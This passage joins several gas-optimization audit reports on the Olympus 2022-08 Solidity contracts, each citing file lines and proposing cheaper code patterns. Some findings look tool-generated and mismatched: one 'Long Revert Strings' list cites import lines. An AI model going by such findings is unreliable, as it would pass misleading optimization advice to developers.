_config.regenObserve;`  43. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  44. 2022-08-olympus/src/policies/Operator.sol (line 705):     `_status.high.count = uint32(0);`   45. 2022-08-olympus/src/policies/Operator.sol (line 707-708):     `            _status.high.nextObservation = uint32(0);             _status.high.lastRegen = uint48(block.timestamp);`  46. 2022-08-olympus/src/policies/Operator.sol (line 717):     `_status.low.count = uint32(0);`   47. 2022-08-olympus/src/policies/Operator.sol (line 719-720):     `            _status.low.nextObservation = uint32(0);             _status.low.lastRegen = uint48(block.timestamp);`   48. 2022-08-olympus/src/policies/PriceConfig.sol (line 58):     `function changeMovingAverageDuration(uint48 movingAverageDuration_)`   49. 2022-08-olympus/src/policies/PriceConfig.sol (line 69):     `function changeObservationFrequency(uint48 observationFrequency_)`  50. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 13-20):     `        uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%)         uint32 cushionDuration; // duration of a single cushion deployment in seconds         uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info.         uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info.         uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%)         uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds         uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall         uint32 regenObserve; // number of price points to observe to determine regeneration`   51. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 31-33):     `        uint32 count; // current number of price points that count towards regeneration         uint48 lastRegen; // timestamp of the last regeneration         uint32 nextObservation; // index of the next observation in the observations array`  52. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 93-95):     `       uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   53. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 101):     `function setReserveFactor(uint32 reserveFactor_) external;`   54. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 110-112):     `       uint32 wait_,         uint32 threshold_,         uint32 observe_`                                                                                                                                              # [G-06] Functions guaranteed to revert when called by normal users can be marked `payable` (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):    1. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 42-46):     `   function grantApproval(         address for_,         ERC20 token_,         uint256 amount_     ) external onlyRole("custodian") {`  2. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 71-75):     `    function increaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole("custodian") {`  3. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 80-85):     `    function decreaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole("custodian") {`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 195):     `function operate() external override onlyWhileActive onlyRole("operator_operate") {`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 346-350):     `function bondPurchase(uint256 id_, uint256 amountOut_)         external         onlyWhileActive         onlyRole("operator_reporter")     {`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 498-624):     `     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_)         external         onlyRole("operator_policy")     {         /// Set spreads on the range module         RANGE.setSpreads(cushionSpread_, wallSpread_);          /// Update range prices (wall and cushion)         _updateRangePrices();     }      /// @inheritdoc IOperator     function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") {         /// Set threshold factor on the range module         RANGE.setThresholdFactor(thresholdFactor_);     }      /// @inheritdoc IOperator     function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {         /// Confirm factor is within allowed values         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.cushionFactor = cushionFactor_;          emit CushionFactorChanged(cushionFactor_);     }      /// @inheritdoc IOperator     function setCushionParams(         uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_     ) external onlyRole("operator_policy") {         /// Confirm values are valid         if (duration_ > uint256(7 days) || duration_ < uint256(1 days))             revert Operator_InvalidParams();         if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)             revert Operator_InvalidParams();          /// Update values         _config.cushionDuration = duration_;         _config.cushionDebtBuffer = debtBuffer_;         _config.cushionDepositInterval = depositInterval_;          emit CushionParamsChanged(duration_, debtBuffer_, depositInterval_);     }      /// @inheritdoc IOperator     function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {         /// Confirm factor is within allowed values         if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.reserveFactor = reserveFactor_;          emit ReserveFactorChanged(reserveFactor_);     }      /// @inheritdoc IOperator     function setRegenParams(         uint32 wait_,         uint32 threshold_,         uint32 observe_     ) external onlyRole("operator_policy") {         /// Confirm regen parameters are within allowed values         if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)             revert Operator_InvalidParams();          /// Set regen params         _config.regenWait = wait_;         _config.regenThreshold = threshold_;         _config.regenObserve = observe_;          /// Re-initialize regen structs with new values (except for last regen)         _status.high.count = 0;         _status.high.nextObservation = 0;         _status.high.observations = new bool[](observe_);          _status.low.count = 0;         _status.low.nextObservation = 0;         _status.low.observations = new bool[](observe_);          emit RegenParamsChanged(wait_, threshold_, observe_);     }      /// @inheritdoc IOperator     function setBondContracts(IBondAuctioneer auctioneer_, IBondCallback callback_)         external         onlyRole("operator_admin")     {         if (address(auctioneer_) == address(0) || address(callback_) == address(0))             revert Operator_InvalidParams();         /// Set contracts         auctioneer = auctioneer_;         callback = callback_;     }      /// @inheritdoc IOperator     function initialize() external onlyRole("operator_admin") {         /// Can only call once         if (initialized) revert Operator_AlreadyInitialized();          /// Request approval for reserves from TRSRY         TRSRY.setApprovalFor(address(this), reserve, type(uint256).max);          /// Update range prices (wall and cushion)         _updateRangePrices();          /// Regenerate sides         _regenerate(true);         _regenerate(false);          /// Set initialized and active flags         initialized = true;         active = true;     }      /// @inheritdoc IOperator     function regenerate(bool high_) external onlyRole("operator_admin") {         /// Regenerate side         _regenerate(high_);     }      /// @inheritdoc IOperator     function toggleActive() external onlyRole("operator_admin") {`   7. File: 2022-08-olympus/src/policies/BondCallback.sol (line 152):     ` function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {`      8. File: 2022-08-olympus/src/policies/BondCallback.sol (line 190):     `function setOperator(Operator operator_) external onlyRole("callback_admin") {`         9. File: 2022-08-olympus/src/policies/Heart.sol (line 130-152):     ` function resetBeat() external onlyRole("heart_admin") {         lastBeat = block.timestamp - frequency();     }      /// @inheritdoc IHeart     function toggleBeat() external onlyRole("heart_admin") {         active = !active;     }      /// @inheritdoc IHeart     function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)         external         onlyRole("heart_admin")     {         rewardToken = token_;         reward = reward_;         emit RewardUpdated(token_, reward_);     }      /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     }`  10. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 45-74):     `    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         onlyRole("price_admin")     {         PRICE.initialize(startObservations_, lastObservationTime_);     }      /// @notice                         Change the moving average window (duration)     /// @param movingAverageDuration_   Moving average duration in seconds, must be a multiple of observation frequency     /// @dev Setting the window to a larger number of observations than the current window will clear     ///      the data in the current window and require the initialize function to be called again.     ///      Ensure that you have saved the existing data and can re-populate before calling this     ///      function with a number of observations larger than have been recorded.     function changeMovingAverageDuration(uint48 movingAverageDuration_)         external         onlyRole("price_admin")     {         PRICE.changeMovingAverageDuration(movingAverageDuration_);     }      /// @notice   Change the observation frequency of the moving average (i.e. how often a new observation is taken)     /// @param    observationFrequency_   Observation frequency in seconds, must be a divisor of the moving average duration     /// @dev      Changing the observation frequency clears existing observation data since it will not be taken at the right time intervals.     ///           Ensure that you have saved the existing data and/or can re-populate before calling this function.     function changeObservationFrequency(uint48 observationFrequency_)         external         onlyRole("price_admin")     {         PRICE.changeObservationFrequency(observationFrequency_);     }`   11. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 45-56):     `    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     }      /// @notice Burn votes from a wallet     /// @param  wallet_ - The address losing the votes.     /// @param  amount_ - The amount of votes to burn from the wallet.     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     }`       # [G-07] Bitshift for divide by 2 (When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.):    1. File: 2022-08-olympus/src/policies/Operator.sol (line 372):     `int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);`  2. File: 2022-08-olympus/src/policies/Operator.sol (line 427):     `int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);`      # [G-08] Use simple comparison in trinary logic (The comparison operators >= and <= use more gas than >,  <, or ==. Replacing the  >= and ≤ operators with a comparison  operator that has an opcode in the EVM saves gas):    1. File: 2022-08-olympus/src/policies/Operator.sol (line 210-218):     `           uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&             _status.high.count >= config_.regenThreshold         ) {             _regenerate(true);         }         if (             uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&             _status.low.count >= config_.regenThreshold         ) {`    # [G-09] Use calldata instead of memory for function parameters (Use calldata instead of memory for function parameters. Having function arguments use calldata instead of memory can save gas.):    1. File: 2022-08-olympus/src/modules/PRICE.sol (line 205-208):     ` function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         permissioned     {`  2. File: 2022-08-olympus/src/policies/BondCallback.sol (line 152):     `function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {`  3. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 45):     `function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 195):     `function operate() external override onlyWhileActive onlyRole("operator_operate") {`         # [G-10]  Amounts should be checked for 0 before calling a transfer (Checking non-zero transfer values can avoid an expensive external call and save gas.  While this is done at some places, it’s not consistently done in the solution.):    1. File: 2022-08-olympus/src/modules/TRSRY.sol (line 82):     `token_.safeTransfer(to_, amount_);`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 99):     `token_.safeTransfer(msg.sender, amount_);`  3. File: 2022-08-olympus/src/modules/TRSRY.sol (line 110):     `token_.safeTransferFrom(msg.sender, address(this), amount_);`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 299):     `ohm.safeTransferFrom(msg.sender, address(this), amountIn_);`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 330):     `reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 124):     `payoutToken.safeTransfer(msg.sender, outputAmount_);`  7. File: 2022-08-olympus/src/policies/BondCallback.sol (line 159):     `token.safeTransfer(address(TRSRY), balance);`   8. File: 2022-08-olympus/src/policies/Heart.sol (line 112):     `rewardToken.safeTransfer(to_, reward);`  9. File: 2022-08-olympus/src/policies/Heart.sol (line 151):     `token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));`   10. File: 2022-08-olympus/src/policies/Governance.sol (line 259):     `VOTES.transferFrom(msg.sender, address(this), userVotes);`  11. File: 2022-08-olympus/src/policies/Governance.sol (line 312):     `VOTES.transferFrom(address(this), msg.sender, userVotes);`                    # [G-11]  Using `bools` for storage incurs overhead.  While this is done at some places, it’s not consistently done in the solution.):    1. File: 2022-08-olympus/src/Kernel.sol (line 113):     `bool public isActive;`  2. File: 2022-08-olympus/src/Kernel.sol (line 197):     `mapping(Role => bool) public isRole;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 62):     `bool public initialized;`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 63):     `bool public initialized;`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 66):     `bool public active;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 24):     `mapping(address => mapping(uint256 => bool)) public approvedMarkets;`  7. File: 2022-08-olympus/src/policies/Heart.sol (line 33):     `bool public active;`  8. File: 2022-08-olympus/src/policies/Governance.sol (line 105):     `mapping(uint256 => bool) public proposalHasBeenActivated;`  9. File: 2022-08-olympus/src/policies/Governance.sol (line 117):     `mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  `      # [G-12]  Using `private` rather than `public` for constants, saves gas (If needed, the value can be read from the verified contract source  code. Savings are due to the compiler not having to create non-payable  getter functions for deployment calldata, and not adding another entry  to the method ID table):    1. File: 2022-08-olympus/src/modules/RANGE.sol (line 65):     `uint256 public constant FACTOR_SCALE = 1e4;`  2. File: 2022-08-olympus/src/modules/PRICE.sol (line 59):     `uint8 public constant decimals = 18;`  3. File: 2022-08-olympus/src/policies/Operator.sol (line 89):     `uint32 public constant FACTOR_SCALE = 1e4;`  4. File: 2022-08-olympus/src/policies/Governance.sol (line 121-137):     `    uint256 public constant SUBMISSION_REQUIREMENT = 100;      /// @notice Amount of time a submitted proposal has to activate before it expires.     uint256 public constant ACTIVATION_DEADLINE = 2 weeks;      /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.     uint256 public constant GRACE_PERIOD = 1 weeks;      /// @notice Endorsements required to activate a proposal as percentage of total supply.     uint256 public constant ENDORSEMENT_THRESHOLD = 20;      /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.     uint256 public constant EXECUTION_THRESHOLD = 33;      /// @notice Required time for a proposal to be active before it can be executed.     /// @dev    This amount should be greater than 0 to prevent flash loan attacks.     uint256 public constant EXECUTION_TIMELOCK = 3 days;`             # [G-13]  Empty blocks should be removed or emit something [The code should be refactored such that they no longer exist, or the  block should do something useful, such as emitting an event or  reverting. If the contract is meant to be extended, the contract should  be `abstract` and the function signatures be added without  any default implementation. If the block is an empty if-statement block  to avoid doing subsequent checks in the else-if/else conditions, the  else-if/else conditions should be nested under the negation of the  if-statement, because they involve different classes of checks, which  may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)]:    1. File: 2022-08-olympus/src/Kernel.sol (line 85):     `constructor(Kernel kernel_) KernelAdapter(kernel_) {}`  2. File: 2022-08-olympus/src/Kernel.sol (line 95):     `function KEYCODE() public pure virtual returns (Keycode) {}`  3. File: 2022-08-olympus/src/Kernel.sol (line 100):     `function VERSION() external pure virtual returns (uint8 major, uint8 minor) {};`  4. File: 2022-08-olympus/src/Kernel.sol (line 105):     ` function INIT() external virtual onlyKernel {}`         5. File: 2022-08-olympus/src/Kernel.sol (line 115):     `constructor(Kernel kernel_) KernelAdapter(kernel_) {}`  6. File: 2022-08-olympus/src/Kernel.sol (line 139-143):     `    function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}      /// @notice Function called by kernel to set module function permissions.     /// @return requests - Array of keycodes and function selectors for requested permissions.     function requestPermissions() external view virtual returns (Permissions[] memory requests) {}`       7. File: 2022-08-olympus/src/modules/TRSRY.sol (line 45):     `constructor(Kernel kernel_) Module(kernel_) {}`  8. File: 2022-08-olympus/src/modules/VOTES.sol (line 19):     `{}`  9. File: 2022-08-olympus/src/modules/INSTR.sol (line 20):     `constructor(Kernel kernel_) Module(kernel_) {}`  10. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 24):     `constructor(Kernel kernel_) Policy(kernel_) {}`         11. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 15):     `constructor(Kernel kernel_) Policy(kernel_) {}`  12. File: 2022-08-olympus/src/policies/Governance.sol (line 59):     `constructor(Kernel kernel_) Policy(kernel_) {}`           13. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 16):     `constructor(Kernel kernel_) Policy(kernel_) {}`  
## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          Governance.sol, 223: if (proposalHasBeenActivated[proposalId_] == true) {         Governance.sol, 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         Operator.sol, 355: if (id_ == RANGE.market(false)) {         Operator.sol, 351: if (id_ == RANGE.market(true)) {    ## Change transferFrom to transfer  'transferFrom(address(this), *, **)' could be replaced by the following more gas efficient 'transfer(*, **)'                This replacement is more gas efficient and improves the code quality.  ### Code instance:          Governance.sol, 312 : VOTES.transferFrom(address(this), msg.sender, userVotes);    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instance:          Governance.sol, instructions, 278    ## Unnecessary index init   In for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas.  It is more clear and gas efficient to declare without assigning 0 and will have the same meaning:  ### Code instance:          Kernel.sol, 397    ## Storage double reading. Could save SLOAD  Reading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the  overall gas uses. The following is a list of functions and the storage variables that you read twice:   ### Code instance:          PRICE.sol: nextObsIndex is read twice in getLastPrice    ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instance:  In Operator.sol,rearranging the storage fields can optimize to: 11 slots from: 13 slots. The new order of types (you choose the actual variables):         1. Status         2. Config         3. OlympusPrice         4. OlympusRange         5. OlympusTreasury         6. OlympusMinter         7. IBondAuctioneer         8. IBondCallback         9. ERC20         10. ERC20         11. uint32         12. uint8         13. uint8         14. bool         15. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instance:          OlympusERC20.sol (L39), string internal UNAUTHORIZED = "UNAUTHORIZED";     ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instance:          FullMath.sol, 35: change 'denominator > 0' to 'denominator != 0'    ## Unnecessary cast        ### Code instances:          Role Kernel.sol.grantRole - unnecessary casting Role(role_)         Kernel Kernel.sol._migrateKernel - unnecessary casting Kernel(newKernel_)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          Operator.sol (L#209) - if ( uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&         Operator.sol (L#215) - if ( uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&         Operator.sol (L#395) - payoutToken: ohm, quoteToken: reserve, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#212) - if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {         Heart.sol (L#94) - if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          Operator.sol (L#447) - payoutToken: reserve, quoteToken: ohm, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#272) - if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {         Governance.sol (L#227) - if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          Kernel.sol, _upgradeModule         Kernel.sol, _activatePolicy         Kernel.sol, _reconfigurePolicies         FullMath.sol, mulDiv         Kernel.sol, _deactivatePolicy         Operator.sol, _addObservation         Kernel.sol, _pruneFromDependents         Kernel.sol, _migrateKernel         Kernel.sol, _installModule    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  Operator.sol, 374 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);  Operator.sol, 419 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;  Operator.sol, 783 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 784 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 752 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, false),  Operator.sol, 764 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 763 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 753 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals()  Operator.sol, 429 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);  Operator.sol, 418 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;     ## Upgrade pragma to at least 0.8.4   Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  The advantages of versions 0.8.* over <0.8.0 are:          1. Safemath by default from 0.8.0 (can be more gas efficient than library based safemath.)         2. Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.         3. Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.         4. Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.      ### Code instance:          OlympusERC20.sol    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L219  
# gas optimization  ### Don't Initialize Variables with Default Value  ### examples ``` 2022-08-olympus\src\Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus\src\utils\KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus\src\utils\KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### Use != 0 instead of > 0 for Unsigned Integer Comparison  ### examples ``` 2022-08-olympus\src\policies\Governance.sol::247 => if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { 2022-08-olympus\src\utils\KernelUtils.sol::46 => if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only 2022-08-olympus\src\utils\KernelUtils.sol::60 => if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) { ```  ### Long Revert Strings  ### examples ``` 2022-08-olympus\src\modules\PRICE.sol::4 => import {AggregatorV2V3Interface} from "interfaces/AggregatorV2V3Interface.sol"; 2022-08-olympus\src\modules\TRSRY.sol::5 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\modules\VOTES.sol::18 => ERC20("OlympusDAO Dummy Voting Tokens", "VOTES", 0) 2022-08-olympus\src\policies\BondCallback.sol::5 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Heart.sol::4 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Heart.sol::7 => import {IOperator} from "policies/interfaces/IOperator.sol"; 2022-08-olympus\src\policies\Operator.sol::4 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Operator.sol::7 => import {IOperator} from "policies/interfaces/IOperator.sol"; ```  ### Use Shift Right/Left instead of Division/Multiplication if possible  ### examples ``` 2022-08-olympus\src\interfaces\IBondAuctioneer.sol::41 => /// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2) 2022-08-olympus\src\policies\Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus\src\policies\Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus\src\policies\Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus\src\policies\Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 2022-08-olympus\src\policies\Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` 
## [G-01] Don't Initialize Variables with Default Value  Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.  ``` 2022-08-olympus/src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus/src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus/src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ## [G-02] Cache Array Length Outside of Loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ``` 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ## [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ``` 2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus/src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus/src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ```  ## [G-04] Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ``` 2022-08-olympus/src/modules/MINTR.sol::9 => OHM public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::68 => ERC20 public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::71 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::82 => ERC20 public immutable ohm; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::85 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; ```  ## [G-05] Functions guaranteed to revert when called by normal users can be marked payable  If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  ``` 2022-08-olympus/src/Kernel.sol::76 => function changeKernel(Kernel newKernel_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::126 => function setActiveStatus(bool activate_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::235 => function executeAction(Actions action_, address target_) external onlyExecutor { 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { 2022-08-olympus/src/policies/BondCallback.sol::190 => function setOperator(Operator operator_) external onlyRole("callback_admin") { 2022-08-olympus/src/policies/Heart.sol::130 => function resetBeat() external onlyRole("heart_admin") { 2022-08-olympus/src/policies/Heart.sol::135 => function toggleBeat() external onlyRole("heart_admin") { 2022-08-olympus/src/policies/Heart.sol::150 => function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") { 